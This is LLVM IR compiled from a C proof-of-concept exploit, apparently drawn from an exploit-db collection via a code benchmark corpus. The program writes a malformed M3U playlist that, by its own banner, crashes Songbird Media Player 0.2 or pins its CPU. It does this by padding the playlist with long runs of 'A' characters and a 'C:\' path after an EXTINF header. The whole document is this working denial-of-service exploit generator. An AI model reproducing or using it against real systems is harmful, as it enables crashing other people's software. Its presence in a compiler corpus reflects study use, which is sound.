; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_2861.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_2861.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [73 x i8] c"\0A======================================================================\0A\00", align 1
@.str.1 = private unnamed_addr constant [73 x i8] c"0-day Songbird Media Player <= 0.2 Format String Denial Of Service PoC \0A\00", align 1
@.str.2 = private unnamed_addr constant [71 x i8] c"Crashes Songbird Player sometimes consumes 99%% CPU and needs reboot \0A\00", align 1
@.str.3 = private unnamed_addr constant [72 x i8] c"Discovered and Coded By: Greg Linares <GLinares.code[at]gmail[dot]com>\0A\00", align 1
@.str.4 = private unnamed_addr constant [29 x i8] c"Usage: %s <output M3U file>\0A\00", align 1
@.str.5 = private unnamed_addr constant [72 x i8] c"====================================================================\0A\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [29 x i8] c"Invalid Number Of Arguments\0A\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"\0ACouldn't Open File!\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.10 = private unnamed_addr constant [69 x i8] c"#EXTM3U\0D\0A#EXTINF:0,0_day_Songbird_Format_String_PoC_by_Greg_Linares\BC\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"\0D\0AC:\\\00", align 1
@.str.12 = private unnamed_addr constant [40 x i8] c"Exploit Succeeded...\0A Output File: %s\0A\0A\00", align 1
@.str.13 = private unnamed_addr constant [81 x i8] c"Questions, Comments, Feedback --> Greg Linares (GLinares.code[at]gmail[dot]com)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca [512 x i8], align 16
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str, i64 0, i64 0))
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.1, i64 0, i64 0))
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.2, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.3, i64 0, i64 0))
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0), i8* %15)
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.5, i64 0, i64 0))
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 2
  br i1 %19, label %20, label %22

20:                                               ; preds = %2
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %64

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i32* @fopen(i8* %25, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  store i32* %26, i32** %6, align 8
  %27 = load i32*, i32** %6, align 8
  %28 = icmp ne i32* %27, null
  br i1 %28, label %31, label %29

29:                                               ; preds = %22
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %64

31:                                               ; preds = %22
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %33 = call i32 @memset(i8* %32, i32 0, i32 512)
  store i32 0, i32* %8, align 4
  br label %34

34:                                               ; preds = %40, %31
  %35 = load i32, i32* %8, align 4
  %36 = icmp slt i32 %35, 512
  br i1 %36, label %37, label %43

37:                                               ; preds = %34
  %38 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %39 = call i32 @strcat(i8* %38, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  br label %40

40:                                               ; preds = %37
  %41 = load i32, i32* %8, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %8, align 4
  br label %34

43:                                               ; preds = %34
  %44 = load i32*, i32** %6, align 8
  %45 = call i32 @fputs(i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.10, i64 0, i64 0), i32* %44)
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %47 = load i32*, i32** %6, align 8
  %48 = call i32 @fputs(i8* %46, i32* %47)
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %50 = load i32*, i32** %6, align 8
  %51 = call i32 @fputs(i8* %49, i32* %50)
  %52 = load i32*, i32** %6, align 8
  %53 = call i32 @fputs(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i32* %52)
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %55 = load i32*, i32** %6, align 8
  %56 = call i32 @fputs(i8* %54, i32* %55)
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.12, i64 0, i64 0), i8* %59)
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.13, i64 0, i64 0))
  %62 = load i32*, i32** %6, align 8
  %63 = call i32 @fclose(i32* %62)
  store i32 0, i32* %3, align 4
  br label %64

64:                                               ; preds = %43, %29, %20
  %65 = load i32, i32* %3, align 4
  ret i32 %65
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @fputs(i8*, i32*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
